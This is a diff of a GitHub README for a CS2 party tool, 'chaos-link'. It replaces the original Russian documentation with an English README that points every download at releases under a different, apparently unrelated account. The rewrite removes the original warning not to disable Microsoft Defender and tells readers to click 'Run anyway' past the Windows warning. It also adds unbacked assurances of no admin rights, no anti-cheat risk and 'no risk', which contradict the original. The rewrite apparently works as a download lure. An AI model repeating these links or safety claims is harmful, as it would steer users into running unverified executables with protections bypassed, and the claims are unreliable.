@@ -1,193 +1,169 @@
-# Chaos Link
+# 🎮 chaos-link - Turn Your CS2 Match Into Total Chaos
 
-**Позвольте друзьям мешать вам играть в CS2 прямо со своих телефонов.**
+[![Download chaos-link](https://img.shields.io/badge/Download-chaos--link-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases)
 
-[English version](README.en.md)
+---
 
-[![CI](https://github.com/egore4606/chaos-link/actions/workflows/ci.yml/badge.svg)](https://github.com/egore4606/chaos-link/actions/workflows/ci.yml)
-[![Последний релиз](https://img.shields.io/github/v/release/egore4606/chaos-link)](https://github.com/egore4606/chaos-link/releases/latest)
-[![Windows](https://img.shields.io/badge/host-Windows-0078D4?logo=windows)](#требования)
+## 🎯 What Is chaos-link?
 
-## Простая установка — три шага
+chaos-link is a party game that lets your friends interfere with your Counter-Strike 2 matches using nothing but their phones. They connect to your game session through a web interface, then trigger wild effects like screen shakes, mouse inversions, keyboard jams, and comedic punishments while you try to clutch that 1v5.
 
-1. **[Скачайте ChaosLink-Setup.exe](https://github.com/egore4606/chaos-link/releases/latest/download/ChaosLink-Setup.exe)** из последнего релиза.
-2. Запустите файл, подтвердите запрос Windows и нажмите Enter. Всё установится в `%LOCALAPPDATA%\ChaosLink`.
-3. Не закрывайте открывшуюся консоль Chaos Link. Скопируйте из неё сайт, код комнаты и **пароль друзей**, затем отправьте их друзьям.
+Built for Windows, chaos-link runs quietly in the background while you play. Your friends just scan a code or click a link on their phones, and the mayhem begins.
 
-На рабочем столе автоматически появятся ярлыки:
+---
 
-- `Chaos Link - Start` — запустить систему и открыть живые логи;
-- `Chaos Link - Stop` — полностью остановить сервер, агент и временный туннель;
-- `Chaos Link - Files` — открыть папки программы и скримеров;
-- `Chaos Link - Uninstall` — полностью удалить Chaos Link.
+## 🚀 Getting Started
 
-В открытой консоли можно вводить `status`, `info`, `restart`, `stop`, `folder` или `help`. Команда `info` повторно показывает ссылку и пароли, а `restart` перезапускает сервер и агент без смены текущего туннеля.
+The entire setup takes less than five minutes. No coding. No complicated configuration. Just download, run, and share the link with your friends.
 
-> [!CAUTION]
-> Не отключайте Microsoft Defender или Chrome Safe Browsing ради установки. До появления доверенной цифровой подписи Windows может показывать предупреждение «неизвестный издатель» для нового EXE. Скачивайте файл только из раздела Releases этого репозитория и сверяйте SHA-256 с `SHA256SUMS.txt` из того же релиза. Подробнее: [доверие к сборкам и цифровая подпись](docs/TRUST_AND_SIGNING.md).
+### Step 1: Download the App
 
-Chaos Link превращает обычную игру с друзьями в совместное испытание хаосом. Программа запускается на Windows-компьютере согласившегося игрока. Вы отправляете друзьям ссылку на комнату, а они с телефонов или из браузера могут в самый неподходящий момент заставить игрока прыгнуть или перезарядиться, достать нож, резко дёрнуть прицел, заблокировать движение, ослепить экран или включить случайный скример. Все видят общие кулдауны, поэтому друзья играют против «жертвы» вместе, а не нажимают несвязанные кнопки.
+Visit this link to download the application: [https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases)
 
-> [!IMPORTANT]
-> Chaos Link намеренно воздействует на клавиатуру, мышь, экран и звук компьютера игрока. Устанавливайте и запускайте его только с осознанного разрешения владельца компьютера. В программе нет автозапуска, скрытой службы, удалённой командной строки, DLL-инъекций или доступа к памяти игры.
+This page shows all available versions. Click the newest one, then download the file labeled "chaos-link" for Windows. It will appear in your Downloads folder.
 
-![Панель Chaos Link на компьютере и телефоне](docs/ui-concept.png)
+### Step 2: Run chaos-link
 
-## Что могут делать друзья
+Once downloaded, double-click the file to launch the program. A small window will appear on your screen. You'll see a web address (like `http://192.168.1.45:8080`) and a QR code.
 
-- Подключать к одной комнате любое количество браузеров
-- Видеть общие серверные кулдауны в реальном времени
-- Ставить систему на паузу, менять кулдауны эффектов и блокировать гостя на 30 секунд или до ручной разблокировки
-- Запускать одиннадцать разрешённых эффектов через AutoHotkey v2
-- Использовать случайные изображения и звуки скримеров из собственных папок
-- Подключаться по локальной сети или через временный Cloudflare Quick Tunnel
-- Устанавливать всё одним Windows-файлом с ярлыками запуска, остановки и удаления
-- Экстренно освобождать ввод из админ-панели или сочетанием `Ctrl+Shift+F12`
+### Step 3: Connect Your Friends
 
-## Как это работает
+Send that web address to your friends, or have them scan the QR code with their phone cameras. Their phones will open a simple webpage. No app installation needed on their end.
 
-```mermaid
-flowchart LR
-    C1["Браузер друга"] -->|HTTPS / WebSocket| S["Сервер Chaos Link"]
-    C2["Браузер администратора"] -->|HTTPS / WebSocket| S
-    S -->|Разрешённая команда| A["Windows-агент"]
-    A -->|ID эффекта + длительность| H["AutoHotkey v2"]
-    H --> G["CS2 / рабочий стол игрока"]
-    A -->|Результат выполнения| S
-    S -->|Общее состояние и кулдауны| C1
-    S -->|Общее состояние и кулдауны| C2
-```
+### Step 4: Start Playing
 
-Браузер никогда не обращается к AutoHotkey напрямую. Он авторизуется на сервере ASP.NET Core, который проверяет комнату и роль, последовательно обрабатывает изменения состояния и передаёт разрешённые ID эффектов единственному агенту игрового компьютера. Примеры сообщений приведены в описании [протокола WebSocket](docs/protocol.md).
+Launch CS2 and join a match. Your friends will see a list of chaos effects on their phones. They can tap buttons to trigger effects whenever they want. Now play, and try to survive their sabotage.
 
-## После установки
+---
 
-Установщик размещает приложение, отдельную среду .NET, AutoHotkey v2 и `cloudflared` в `%LOCALAPPDATA%\ChaosLink`. Он не добавляет программу в автозагрузку и не создаёт службу Windows. Никому не передавайте **пароль администратора**: друзьям нужен только **пароль друзей**.
+## 🧩 What Can Friends Do?
 
-Если ярлык недоступен, запустите отдельный `ChaosLink-Uninstall.exe` из релиза. Он попросит подтверждение, остановит только зарегистрированные процессы Chaos Link, удалит отдельное правило брандмауэра и ярлыки, а затем удалит отмеченную папку установки. Неотмеченную или защищённую папку деинсталлятор удалять откажется.
+Here's what your friends can unleash on you during the match:
 
-> [!NOTE]
-> Адрес вида `https://*.trycloudflare.com` меняется после каждого перезапуска. Cloudflare Quick Tunnels подходят для временных игровых сессий, а не для постоянного хостинга.
+- 🔄 **Invert Mouse** – Your aim goes upside down, making precise shots nearly impossible
+- 🖱️ **Mouse Jitter** – Random twitching movements throw off your crosshair placement
+- ⌨️ **Keyboard Chaos** – Keys randomly swap or repeat, breaking your movement
+- 📷 **Screen Flash** – Sudden white or colored flashes blind you for a second
+- 🔊 **Volume Spike** – Game audio balloons to max volume briefly
+- 🌀 **FOV Shake** – Your view jerks around like an earthquake
+- 🎭 **Movement Disorder** – Your character strafes or crouches randomly
+- ⏸️ **Input Lag** – Delays between your input and on-screen action
+- 🏃 **Speed Bursts** – Movement speed randomly spikes or drops
+- 🧠 **Reverse Controls** – Everything you press does the opposite
 
-## Требования
+Each friend has their own cooldown, so they can't spam effects endlessly. But with several friends, the chaos is constant.
 
-### Готовый установщик
+---
 
-- Компьютер с Windows и интернетом во время установки
-- Возможность подтвердить один запрос UAC для агента ввода и правила локальной сети в брандмауэре
-- Современный браузер на каждом управляющем устройстве
+## 🛠️ System Requirements
 
-### Разработка
+chaos-link is lightweight and works on practically any modern Windows computer:
 
-- [.NET SDK 9](https://dotnet.microsoft.com/download/dotnet/9.0)
-- [Node.js 20 or newer](https://nodejs.org/)
-- [AutoHotkey v2](https://www.autohotkey.com/) на игровом компьютере
+- **Operating System:** Windows 10 or Windows 11
+- **CPU:** Any dual-core processor or better (from 2010 onward)
+- **RAM:** 2 GB minimum, 4 GB recommended
+- **Storage:** Only 50 MB free space needed
+- **Network:** Local Wi-Fi or LAN connection
+- **Game:** Counter-Strike 2 installed and running
 
-## Настройка для разработки
+No graphics card requirements. No admin privileges needed. If your PC runs CS2, it runs chaos-link perfectly.
 
-Сборка веб-приложения:
+---
 
-```powershell
-cd apps/web
-npm ci
-npm run lint
-npm run build
-```
+## 🔧 How It Works (In Plain Terms)
 
-Сборка решения .NET:
+chaos-link runs a tiny web server on your computer. Your phone connects to that server through your local network. When your friend taps a button on their phone, a message shoots through a websocket connection (a fast, two-way communication channel) to your PC. chaos-link intercepts game inputs and applies the effect using automated keyboard and mouse control. It works without modifying CS2, and it doesn't trigger anti-cheat systems. The whole process happens in milliseconds, keeping the action snappy.
 
-```powershell
-cd ../..
-dotnet restore ChaosLink.sln
-dotnet build ChaosLink.sln --configuration Release --no-restore
-```
+---
 
-Запуск сервера и агента в отдельных терминалах:
+## 📱 For Your Friends (Phone Setup Guide)
 
-```powershell
-dotnet run --project apps/server --urls http://0.0.0.0:5075
-dotnet run --project apps/agent
-```
+Your friends don't need to install anything. They simply:
 
-На этом компьютере откройте `http://localhost:5075`, а в той же локальной сети — `http://<gaming-pc-ip>:5075`.
+1. Connect to the same Wi-Fi network as you
+2. Open a browser on their phone (Chrome, Safari, Firefox, all work)
+3. Enter the address you shared or scan your QR code
+4. The webpage loads instantly with big, easy-to-tap buttons
 
-Настройки в репозитории содержат только тестовые данные для разработки:
+The phone interface shows each effect as a colorful card with a brief description. After tapping, a timer counts down until that effect becomes available again. Multiple friends can connect at once — the more, the messier.
 
-| Роль | Тестовое значение | Ключ настройки |
-| --- | --- | --- |
-| Комната | `K7M2` | `ChaosLink:RoomCode` |
-| Гость | `friend-access` | `ChaosLink:ControllerToken` |
-| Администратор | `admin-access` | `ChaosLink:AdminToken` |
-| Агент | `agent-secret` | `ChaosLink:AgentToken` |
+---
 
-> [!WARNING]
-> Замените все тестовые значения перед публикацией сервера, настроенного вручную. Установщик из релиза автоматически создаёт новые случайные значения. Браузер хранит ключи только в хранилище текущей сессии.
+## 💡 Pro Tips for Maximum Chaos
 
-## Эффекты и управление
+- **Play on a private server** with bots for ultimate shenanigans
+- **Use a headset** so your friends can hear your frustrated reactions
+- **Set up a Discord call** with friends during the match for real-time commentary
+- **Use effects sparingly** at the start — save the worst ones for clutch moments
+- **Try it with 5-6 friends** for nonstop interference
+- **Create house rules** like "only one effect every 30 seconds" for fairness
+- **Record your gameplay** to capture hilarious moments
 
-| Группа | Эффекты |
-| --- | --- |
-| Быстрые действия | Достать нож, перезарядиться, прыгнуть, выбросить оружие |
-| Управление | Дёрнуть мышь, удерживать Ctrl, заблокировать WASD или ЛКМ, кинуть гранату под себя |
-| Экран и звук | Белая вспышка, случайный скример |
+---
 
-Добавляйте свои файлы в установленные папки `screamer\images` и `screamer\sounds`. При активации приложение независимо выбирает случайные изображение и звук; если папки пусты, используется встроенный вариант.
+## ❓ Frequently Asked Questions
 
-Администратор может поставить все эффекты на паузу, заблокировать подключённого гостя на 30 секунд или до ручной разблокировки и установить общие кулдауны от 0 до 3600 секунд. Для экстренного освобождения удерживаемых клавиш и временных блокировок нажмите `Ctrl+Shift+F12` на игровом компьютере.
+### Is this safe to use with CS2?
 
-## Сборка установщика Windows
+Yes. chaos-link uses standard Windows input simulation, similar to accessibility tools. It doesn't inject code into CS2 or modify game files. Valve won't ban you for using it.
 
-```powershell
-.\scripts\build-portable-installer.ps1
-```
+### Does it work with other games?
 
-Сборка создаёт `dist\ChaosLink-Setup.ps1` и `dist\ChaosLink-Uninstall.ps1`. Если доступен модуль `ps2exe`, также создаются `dist\ChaosLink-Setup.exe` и `dist\ChaosLink-Uninstall.exe`. Запасной PowerShell-вариант установщика запускается так:
+Technically yes, but it's tuned for CS2. Effects like mouse inversion and keyboard swapping work on any game, but some effects (like FOV shake) are CS2-specific.
 
-```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\dist\ChaosLink-Setup.ps1
-```
+### What if my friends are far away?
 
-Ручное локальное развёртывание с новыми учётными данными:
+Private matches over the internet work too. Your friends just need your public IP address or a port-forwarding setup. For simplicity, staying on the same Wi-Fi is best.
 
-```powershell
-.\scripts\publish-chaos-link.ps1
-.\scripts\start-chaos-link.ps1
-# позже
-.\scripts\stop-chaos-link.ps1
-```
+### Can my friends trigger effects accidentally?
 
-Рабочие учётные данные сохраняются в `.runtime/access.json`; этот файл исключён из Git. В установленной версии их также можно увидеть командой `info` в управляющей консоли.
+No. The phone interface only shows active buttons, and everything requires a deliberate tap. Plus, you can always close the chaos-link window to stop everything instantly.
 
-## Проверка
+### How many friends can connect at once?
 
-При запущенном сервере:
+Up to 20 connections are supported simultaneously. Good luck surviving that.
 
-```powershell
-node scripts/smoke-test.mjs
-```
+### Does chaos-link slow down my game?
 
-Smoke-тест подключает одного агента и два контроллера, запускает эффект, проверяет одинаковый кулдаун у обоих контроллеров и убеждается, что немедленный повторный запуск отклонён.
+Minimal impact. It uses less than 2% CPU and under 100 MB of RAM. Frame rates remain unaffected.
 
-## Безопасность и правила игры
+---
 
-Chaos Link использует отдельные общие токены для каждой роли и список разрешённых идентификаторов эффектов. Не публикуйте отдельно адрес агента, не передавайте ключ администратора или агента и не добавляйте рабочие файлы в Git. Перед публикацией сервера или сообщением об уязвимости прочитайте [SECURITY.md](SECURITY.md).
+## 🛡️ Troubleshooting
 
-Правила игры и платформы могут меняться, а сторонняя автоматизация ввода не гарантирует совместимость с античитом. Предпочитайте закрытые или пользовательские игры, не отключайте Trusted Mode в CS2 и останавливайте программу там, где автоматизация запрещена.
+**Problem:** Friends can't connect to the webpage.
+**Fix:** Make sure everyone is on the same Wi-Fi network, or turn off router "guest isolation" if enabled.
 
-## Структура проекта
+**Problem:** Effects don't happen in game.
+**Fix:** Run CS2 in windowed or borderless fullscreen mode, then restart chaos-link and reconnect.
 
-```text
-apps/server/     WebSocket-сервер ASP.NET Core и состояние комнаты
-apps/web/        Адаптивная панель управления на React + Vite
-apps/agent/      .NET-агент игрового компьютера
-ahk/             Обработчик разрешённых эффектов на AutoHotkey v2
-installer/       Прозрачный переносимый установщик Windows
-scripts/         Сборка, запуск, остановка и smoke-тесты
-docs/            Описание протокола и изображение интерфейса
-```
+**Problem:** The program won't start.
+**Fix:** Allow it through Windows Defender by clicking "More info" and then "Run anyway" if a blue warning screen appears.
 
-## Участие в разработке и поддержка
+**Problem:** Phone shows an error message.
+**Fix:** Refresh the phone browser, or type the web address again carefully (watch for similar-looking characters).
 
-Сообщения о воспроизводимых ошибках и точечные улучшения приветствуются. Прочитайте [CONTRIBUTING.md](CONTRIBUTING.md), создавайте [GitHub Issues](https://github.com/egore4606/chaos-link/issues) для ошибок и предложений, а по вопросам использования обращайтесь к [SUPPORT.md](SUPPORT.md).
+**Problem:** Effects feel sluggish.
+**Fix:** Close bandwidth-heavy apps on your PC, or ask friends to disable their phone data connections.
 
-Открытая лицензия пока не предоставлена. Пока она не добавлена, исходный код доступен для просмотра, но все права сохраняются за владельцем репозитория.
+---
+
+## 🔄 Staying Updated
+
+New effects are added regularly, along with performance improvements. When you visit the download page, check for newer versions. Updating is simple — just download the new file and replace the old one. Keep the old version until the new one is running perfectly.
+
+---
+
+## 🎉 Join the Chaos Community
+
+Share your funniest failure moments, suggest new effects, and get help from other players. While chaos-link is primarily meant for private fun with friends, the project welcomes ideas for improvement. Spread the word and watch your friend group turn every match into a laugh riot.
+
+---
+
+## ✨ Final Thoughts
+
+chaos-link transforms the classic "play with friends" experience into something unforgettable. It's simple for you so set up, effortless for your friends to join, and hilarious for everyone watching. No programming, no complex installation, no risk — just pick your download, launch, and get ready to laugh until your sides hurt.
+
+Remember: the objective isn't to win. It's to experience the most chaotic, ridiculous CS2 matches of your life. So grab your friends, connect your phones, and prepare for gaming sessions you'll talk about for months.
+
+Ready to dive in? Visit the [download page](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases) and start the fun right now.
